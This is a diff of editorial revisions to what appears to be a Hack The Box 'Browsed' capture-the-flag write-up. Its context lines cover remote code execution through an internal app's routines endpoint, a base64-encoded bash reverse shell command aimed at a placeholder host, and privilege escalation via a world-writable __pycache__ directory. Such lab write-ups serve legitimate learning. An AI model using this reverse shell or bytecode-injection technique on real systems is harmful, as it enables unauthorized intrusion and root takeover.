@@ -69,7 +69,7 @@ At `http://browsed.htb/samples.html` we have some extensions samples that we can
 
 ![Browsed extension upload page](/images/HTB-Browsed/extension_upload.png)
 
-After downloading and extracting `fontify.zip` we obtain a few files representing the source code of the application.
+After downloading and extracting `fontify.zip` we obtain the source files of the extension.
 
 ![fontify source files](/images/HTB-Browsed/fontify.png)
 
@@ -207,7 +207,7 @@ Going to `http://browsedinternals.htb/` we find a Python application called `Mar
 
 ![Browsed Gitea instance](/images/HTB-Browsed/browsed_Gitea.png)
 
-In `aap.py` we learn that this application "should only be accessible through localhost" at `127.0.0.1` on port `5000`. The application also exposes different endpoints however only `/routines` accepts some input (`routine ID`).
+In `apsp.py` we learn that this application "should only be accessible through localhost" at `127.0.0.1` on port `5000`. The application also exposes different endpoints however only `/routines` accepts some input (`routine ID`).
 
 ![MardownPreview source code](/images/HTB-Browsed/MardownPreview_gitea.png)
 
@@ -281,7 +281,7 @@ On the listener we get a response as a GET request confirming we have command ex
 
 ![curl RCE](/images/HTB-Browsed/curl_CE.png)
 
-We only need to replace the value of `b64` with a reverse shell command now
+We only need to replace the value of `b64` with a reverse shell command now:
 ```
 echo "bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'" | base64
 ```
@@ -301,14 +301,14 @@ We run `sudo -l` to check the sudo privileges.
 The user `larry` can run `/opt/extensiontool/extension_tool.py` as root without the root password.
 
 The script `/opt/extensiontool/extension_tool.py` does a few different things:
-- it loads an extension from `/opt/extensiontool/extensions/<name>/`
-- validates `manifest.json`
-- optionally **rewrite** `manifest.json` when `--bump` is used
-- optionally create a zip in `/opt/extensiontool/temp/<basename>`
+- it loads an extension from `/opt/extensiontool/extensions/<name>/`.
+- validates `manifest.json`.
+- optionally rewrite `manifest.json` when `--bump` is used.
+- optionally create a zip in `/opt/extensiontool/temp/<basename>`.
 
 With LinPEAS we discover that `/opt/extensiontool/__pycache__` is writable by everyone.
 
-A world-writable `__pycache__` directory allows attackers to inject malicious Python bytecode that may be executed by privileged processes during module import, leading to arbitrary code execution and privilege escalation.
+A world-writable `__pycache__` directory allows attackers to inject malicious Python bytecode that may be executed by privileged processes during module import, possibly leading to arbitrary code execution and privilege escalation.
 
 ![world-writable pycache directory](/images/HTB-Browsed/pycache_writable.png)
 
